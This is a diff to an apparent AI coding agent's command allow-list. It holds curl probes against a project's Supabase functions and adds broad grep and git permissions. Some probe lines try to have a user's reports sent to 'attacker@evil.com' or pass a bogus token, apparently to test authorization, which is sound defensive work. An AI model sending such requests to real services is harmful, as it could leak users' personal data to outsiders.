@@ -49,7 +49,11 @@
       "Bash(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"https://hvnkxxazjfesbxdkzuba.supabase.co/functions/v1/get-insights\" -H \"Content-Type: application/json\" -H \"Authorization: Bearer notavalidtoken\" -d '{\"userId\":\"90eb11c3-c1e9-4241-8362-9e15ce231c33\"}')",
       "Bash(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"https://hvnkxxazjfesbxdkzuba.supabase.co/functions/v1/weekly-report\" -H \"Content-Type: application/json\" -d '{\"userId\":\"90eb11c3-c1e9-4241-8362-9e15ce231c33\",\"email\":\"attacker@evil.com\"}')",
       "Bash(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"https://hvnkxxazjfesbxdkzuba.supabase.co/functions/v1/generate-monthly-report\" -H \"Content-Type: application/json\" -d '{\"userId\":\"90eb11c3-c1e9-4241-8362-9e15ce231c33\",\"email\":\"attacker@evil.com\"}')",
-      "Bash(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"https://hvnkxxazjfesbxdkzuba.supabase.co/functions/v1/push-notify\" -H \"Content-Type: application/json\" -d '{}')"
+      "Bash(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"https://hvnkxxazjfesbxdkzuba.supabase.co/functions/v1/push-notify\" -H \"Content-Type: application/json\" -d '{}')",
+      "Bash(grep *)",
+      "Bash(git revert *)",
+      "Bash(git pull *)",
+      "Bash(git cherry-pick *)"
     ]
   }
 }
